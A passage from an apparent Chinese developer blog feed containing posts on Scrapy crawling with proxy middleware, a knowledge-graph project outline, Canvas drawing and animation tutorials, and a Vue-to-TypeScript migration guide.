punctuation">)</span></code></pre></li><li>解析详情页(示例)<pre class=" language-python"><code class="language-python"> baseinfo <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[@class="c-card__paper2"]'</span><span class="token punctuation">)</span> keywords <span class="token operator">=</span> baseinfo<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[contains(text(),"关键词")]/following-sibling::*/a/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ol><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>为了提高爬取速度，防止ip被识别的可能，推荐阿布云进行IP代理，申请账号及HTTP动态隧道后，更改settings:</p><pre class=" language-python"><code class="language-python">    DOWNLOAD_DELAY <span class="token operator">=</span> <span class="token number">0.2</span>    DOWNLOADER_MIDDLEWARES <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'myspider.middlewares.RandomUserAgentMiddleware'</span><span class="token punctuation">:</span> <span class="token number">401</span><span class="token punctuation">,</span>        <span class="token string">'myspider.middlewares.ABProxyMiddleware'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    AB_PROXY_SERVER <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'proxyServer'</span><span class="token punctuation">:</span> <span class="token string">"http://http-dyn.abuyun.com:9020"</span><span class="token punctuation">,</span>        <span class="token string">'proxyUser'</span><span class="token punctuation">:</span> <span class="token string">"xxxxxxxxxxxxxxx"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#你的</span>        <span class="token string">'proxyPass'</span><span class="token punctuation">:</span> <span class="token string">"xxxxxxxxxxxxxxx"</span><span class="token comment" spellcheck="true">#你的</span>    <span class="token punctuation">}</span></code></pre><p>添加中间件：</p><pre class=" language-python"><code class="language-python">proxyAuth <span class="token operator">=</span> <span class="token string">"Basic "</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>proxyUser <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> proxyPass<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">ABProxyMiddleware</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">""" 阿布云ip代理配置 """</span>    <span class="token keyword">def</span> <span class="token function">process_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">"proxy"</span><span class="token punctuation">]</span> <span class="token operator">=</span> proxyServer        request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Proxy-Authorization"</span><span class="token punctuation">]</span> <span class="token operator">=</span> proxyAuth</code></pre><hr><p>爬虫菜鸟，有问题请帮忙指出！</p>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识图谱-从构建到呈现</title>
      <link href="/2018/11/05/zhi-shi-tu-pu-cong-gou-jian-dao-cheng-xian/"/>
      <url>/2018/11/05/zhi-shi-tu-pu-cong-gou-jian-dao-cheng-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="http://jena.apache.org/" target="_blank" rel="noopener">Apache Jena</a></li><li><a href="http://openkg.cn/tool/eb483ee4-3be1-4d4b-974d-970d35307e8d" target="_blank" rel="noopener"> 基于 REfO 的 KBQA 实现及示例</a></li><li><a href="https://zhuanlan.zhihu.com/knowledgegraph" target="_blank" rel="noopener">知识图谱-给AI装个大脑</a></li></ul><h4 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h4><ul><li>构建实体概念<ul><li>工具：Protégé</li></ul></li><li>构建三元组数据库TDB<ul><li>数据采集：爬虫基础(百度百科，去哪儿网，etc)</li><li>Apache Jena: 开源Java框架</li><li>NLP: jieba / hanlp / libsvm</li></ul></li><li>数据查询和推导<ul><li>SPARQL：查询TDB数据库</li></ul></li><li>呈现<ul><li>Echarts<br><img src="/img/in-post/kg-03.JPG" alt=""></li></ul></li></ul><h4 id="项目框架"><a href="#项目框架" class="headerlink" title="项目框架"></a>项目框架</h4><p><img src="/img/in-post/kg-01.JPG" alt=""><br><img src="/img/in-post/kg-02.JPG" alt=""></p><h4 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h4><p><img src="/img/in-post/kg-04.JPG" alt=""></p><h4 id="可视化示例"><a href="#可视化示例" class="headerlink" title="可视化示例"></a>可视化示例</h4><p><img src="/img/in-post/kg-05.JPG" alt=""><br><img src="/img/in-post/kg-06.JPG" alt=""><br><img src="/img/in-post/kg-07.JPG" alt=""><br><img src="/img/in-post/kg-08.JPG" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识图谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas学习笔记（二）—— 绘制2D宇宙星轨</title>
      <link href="/2018/11/01/canvas-xue-xi-bi-ji-er/"/>
      <url>/2018/11/01/canvas-xue-xi-bi-ji-er/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.ephemeron.top/2018/11/20/Canvas%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">Canvas学习笔记（一）</a></p><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><iframe src="/project/canvas/universe.html" width="600px" height="600px" frameborder="0" scrolling="no"></iframe><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul><li>确定画布中不动的元素：中心的星球，轨道</li><li>确定画布中移动的元素：绕中心星球旋转的行星</li><li>旋转用到的变换操作：<code>rotate(弧度)</code>, 旋转变换速度函数：使用匀速旋转</li><li>确定最大半径，确定轨道条数</li></ul><h4 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h4><ul><li>绘制一个圆形：使用<code>arc</code>绘制圆形路径，使用<code>fill</code>填充路径</li><li>save和restore可以保存和恢复上下文的设置和变换到栈结构</li></ul><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul><li>画不动的元素<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> circleRadius <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> radius <span class="token operator">=</span> <span class="token number">250</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">drawStaticContext</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span> <span class="token punctuation">{</span>cxt<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span><span class="token string">"#6D819C"</span>cxt<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token string">"1"</span>circleRadius<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span> <span class="token keyword">function</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>radius<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> element<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#F9D423"</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>shadowColor<span class="token operator">=</span><span class="token string">"#FC913A"</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>shadowBlur <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>radius<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">restore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>定时执行的函数<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span> <span class="token punctuation">{</span>cxt<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">drawStaticContext</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span>radius<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#C89EC4"</span><span class="token punctuation">;</span>circleRadius<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> angle <span class="token operator">=</span> time <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">rotate</span><span class="token punctuation">(</span>angle <span class="token operator">*</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> element<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  cxt<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>time<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">restore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>调用<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvas<span class="token punctuation">.</span>getContext<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> context <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">drawStaticContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">run</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4></li><li>动画的基本步骤：<ul><li>清空canvas：<code>clearRect</code></li><li>保存canvas状态：如果要改变一些会改变canvas状态的设置(样式，变形之类)，又要在每帧之前恢复原始状态</li><li>绘制动画图形</li><li>恢复canvas状态</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canvas学习笔记（一）</title>
      <link href="/2018/11/01/canvas-xue-xi-bi-ji-yi/"/>
      <url>/2018/11/01/canvas-xue-xi-bi-ji-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li>《JavaScript高级程序设计》</li></ul><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li>坐标轴<br><img src="/img/in-post/canvas-01.JPG" alt="Canvas坐标轴方向"></li><li>指定绘图区域大小<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>canvas id<span class="token operator">=</span><span class="token string">"drawing"</span> width<span class="token operator">=</span><span class="token string">"200"</span> height<span class="token operator">=</span><span class="token string">"200"</span><span class="token operator">></span>your broswer is not supporting canvas<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>canvas<span class="token operator">></span></code></pre></li><li>取得绘图上下文<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> drawing  <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'drawing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//确定浏览器支持</span><span class="token keyword">if</span><span class="token punctuation">(</span>drawing<span class="token punctuation">.</span>getContext<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> context <span class="token operator">=</span> drawing<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>获取画布的图像数据<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>drawing<span class="token punctuation">.</span>getContext<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> imgURI <span class="token operator">=</span> drawing<span class="token punctuation">.</span><span class="token function">toDataURL</span><span class="token punctuation">(</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> image <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>image<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>image<span class="token punctuation">.</span>src <span class="token operator">=</span> imgURI<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="2D上下文"><a href="#2D上下文" class="headerlink" title="2D上下文"></a>2D上下文</h4></li><li>填充和描边<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//描边</span>context<span class="token punctuation">.</span>strokeStyle <span class="token operator">=</span> <span class="token string">"red"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//填充</span>context<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">"#0000ff"</span><span class="token punctuation">;</span></code></pre></li><li>绘制矩形<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//四个参数：x坐标，y坐标，矩形宽度，矩形高度</span><span class="token comment" spellcheck="true">// 红色填充矩形</span>context<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">"#ff0000"</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 红色描边矩形</span>context<span class="token punctuation">.</span>strokeStyle <span class="token operator">=</span> <span class="token string">"#ff0000"</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">strokeRect</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 清除指定位置指定大小矩形区域</span>context<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>绘制路径<ul><li><strong>绘制弧线</strong><code>arc(x, y, radius,startAngle, endAngle, counterclockwise)</code>: 最后一个参数表示是否按逆时针方向计算</li><li><strong>从上一点绘制弧线</strong><code>arcTo(x1, y1, x2, y2, radius)</code>: 表示穿过(x1, y1), (x2, y2)且半径为radius的一条弧线</li><li><strong>绘制bezier曲线</strong><code>bezierCurveTo(c1x, c1y, c2x, c2y, x, y)</code>: (c1x, c1y), (c2x, c2y)为控制点，从上一点绘制曲线到(x, y)</li><li><strong>绘制直线</strong><code>lineTo(x, y)</code>：从上一点绘制到(x, y)</li><li><strong>移动游标</strong><code>moveTo(x, y)</code>：不画线</li><li><strong>绘制二次曲线</strong><code>quadraticCurveTo(cx, cy, x, y)</code>：从上一点绘制一条二次曲线，(cx, cy)为控制点</li><li><strong>绘制矩形路径</strong><code>rect(x, y, width, height)</code>：是路径而不是描边矩形！</li></ul></li><li>路径操作方法<ul><li><code>beginPath()</code>：开始绘制路径</li><li><code>closePath()</code>：绘制连接到路径起点的线条</li><li><code>fill()</code>：填充路径</li><li><code>stroke()</code>：路径描边</li><li><code>clip()</code>：创建剪切区域</li></ul></li><li>绘制文本<ul><li><code>font</code>: 字体</li><li><code>textAlign</code>：文本对齐方式，start, end, left, right, center</li><li><code>textBaseline</code>：文本基线，top, hanging, middle, alphabetic, ideographic, bottom</li><li><code>fillText()</code>：填充文本</li><li><code>strokeText()</code>：文本描边</li></ul></li><li>变换<ul><li><strong>绕原点旋转</strong><code>rotate(angle)</code></li><li><strong>在x,y方向上以倍数缩放</strong><code>scale(scaleX, scaleY)</code></li><li><strong>平移</strong><code>translate(x, y)</code>：坐标原点移动到点(x, y)</li><li><strong>使用矩阵变换</strong><code>transform(m11, m12m, m21, m22m dx, dy)</code></li><li><strong>重置变换矩阵</strong><code>setTransform(m11, m12m, m21, m22m dx, dy)</code></li></ul></li><li>状态<ul><li><code>save()</code></li><li><code>restore()</code></li></ul></li><li><p>绘制图像——把一幅图像绘制到画布上</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 获取image对象，DOM或者动态创建</span><span class="token keyword">var</span> image <span class="token operator">=</span> document<span class="token punctuation">.</span>image<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 绘制的起点位置(10, 10),图像大小20✖30</span>context<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><code>drawImage(image, sx, sy, sw, sh, tx, ty, tw, th)</code></li><li>将原图像(sx, sy)起始点大小为sw✖sh的图像绘制到画布上起始点为(tx, ty)大小为tw✖th的区域</li><li>图像如果来自其他域，调用<code>toDataURL</code>会抛出一个错误，认为当前上下文被污染了</li></ul></li><li><p>阴影</p><ul><li><code>shadowColor</code>：阴影颜色</li><li><code>shadowOffsetX</code>：形状或者路径x轴方向偏移量</li><li><code>shadowOffsetY</code>：形状或者路径y轴方向偏移量</li><li><code>shadowBlur</code>：模糊的像素度</li></ul></li><li><p>渐变</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//(30, 30)到(70, 70)的线性渐变</span><span class="token keyword">var</span> gradient <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createLinearGradient</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 创建放射渐变:两个圆的圆心及半径</span><span class="token keyword">var</span> gradient <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createRadialGradient</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gradient<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gradient<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"black"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>模式<pre class=" language-javascript"><code class="language-javascript">pattern <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createPattern</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string">"repeat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> pattern<span class="token punctuation">;</span></code></pre><ul><li>参数可以是image/video/Canvas</li><li>重复方式：repeat / repeat-x / repeat-y / no-repeat</li></ul></li><li>合成<ul><li><code>globalCompositionOperation</code><ul><li>source-over(默认)： 后绘制图形位于先绘制图行上方</li><li>source-in: 后绘制图形与先绘制图形重合部分可见，两者其余部分透明</li><li>source-out: 后绘制的图形与先绘制的图形不重叠部分可见，先绘制图形完全透明</li><li>source-atop：后绘制图形与先绘制图形重合部分可见，先绘制图形不受影响</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习（四）之TypeScript重构</title>
      <link href="/2018/10/29/vue-xue-xi-si-zhi-typescript-chong-gou/"/>
      <url>/2018/10/29/vue-xue-xi-si-zhi-typescript-chong-gou/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://typescript.bootcss.com/tutorials/migrating-from-javascript.html" target="_blank" rel="noopener">typescript文档</a></p><h4 id="TypeScript基础"><a href="#TypeScript基础" class="headerlink" title="TypeScript基础"></a>TypeScript基础</h4><blockquote><p>TypeScript is a typed superset of JavaScript that compiles to plain JavaScript    </p></blockquote><ul><li><p>概念：TypeScript 是 JavaScript 的一个超集；设计目标是开发大型应用，它可以编译成纯 JavaScript，编译出来的 JavaScript 可以运行在任何浏览器上；TypeScript 通过类型注解提供编译时的静态类型检查<br><img src="/img/in-post/ts-00.JPG" alt="TypeScript集"></p></li><li><p>主要优点</p><ul><li><strong>静态检查</strong>：静态类型检查可以避免很多不必要的错误, 不用在调试的时候才发现问题；IDE 智能提示；类型推断；非空判断</li><li>面向对象编程增强：接口；泛型；</li><li>模块系统增强：命名空间</li><li>代码可维护性：有了强类型约束和静态检查，以及智能IDE的帮助下，可以降低软件腐化的速度，提升可维护性，且在重构时提高效率</li><li>运行时稳定性</li></ul></li><li>语法基础<ul><li>基本类型：<ul><li><code>boolean</code></li><li><code>number</code></li><li><code>string</code></li><li>数组：<code>eg. number[] or Array&lt;元素类型&gt;</code></li><li>元组：元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同 <code>eg. [string, number]</code></li><li>枚举：<code>eg.enum Color {Red, Green, Blue}</code></li><li><code>any</code>：在编程阶段还不清楚类型的变量指定一个类型</li><li><code>void</code>：它表示没有任何类型。 当一个函数没有返回值时，你通常会见到其返回值类型是 void</li><li>Null 和 Undefined</li><li><code>object</code></li><li><code>never</code></li></ul></li><li>类型断言：假设我们能确保某值是哪个类型，“尖括号”语法/as语法</li><li>装饰器：装饰器是一种特殊类型的声明，它能够被附加到类声明，方法， 访问符，属性或参数上。 装饰器使用 <code>@expression</code>这种形式，<code>expression</code>求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入</li></ul></li></ul><h4 id="项目重构"><a href="#项目重构" class="headerlink" title="项目重构"></a>项目重构</h4><blockquote><p>项目环境：Vue 2.0 + node 10.13.0<br>目标：配置Vue2.0环境下支持ts和tsx语法</p></blockquote><ul><li>vue-cli安装vue</li><li>添加包<pre class=" language-bash"><code class="language-bash">yarn add ts-loader tslint tslint-config-standard tslint-loader typescriptyarn add vue-tsx-supportyarn add vue-class-component vue-property-decoratoryarn add babel-plugin-syntax-jsx babel-plugin-transform-vue-jsx  babel-helper-vue-jsx-merge-props</code></pre></li><li>将src项目下的js文件改成ts文件</li><li>在项目根目录下的<code>tsconfig.json</code>文件中指定了用来编译这个项目的根文件和编译选项，我自定义配置如下：<a href="https://www.html.cn/doc/typescript/doc/handbook/tsconfig.json.html" target="_blank" rel="noopener">（更多）</a><pre class=" language-bash"><code class="language-bash">// tsconfig.json<span class="token punctuation">{</span><span class="token string">"include"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>  <span class="token string">"src/**/*"</span><span class="token punctuation">]</span>,<span class="token string">"exclude"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>  <span class="token string">"node_modules"</span><span class="token punctuation">]</span>,<span class="token string">"compilerOptions"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>  // 允许从没有设置默认导出的模块中默认导入  <span class="token string">"allowSyntheticDefaultImports"</span><span class="token keyword">:</span> true,  // 启用装饰器  <span class="token string">"experimentalDecorators"</span><span class="token keyword">:</span> true,  // 允许js和jsx  <span class="token string">"allowJs"</span><span class="token keyword">:</span> true,  <span class="token string">"jsx"</span><span class="token keyword">:</span> <span class="token string">"preserve"</span>,  // 与 Vue 的浏览器支持保持一致  <span class="token string">"target"</span><span class="token 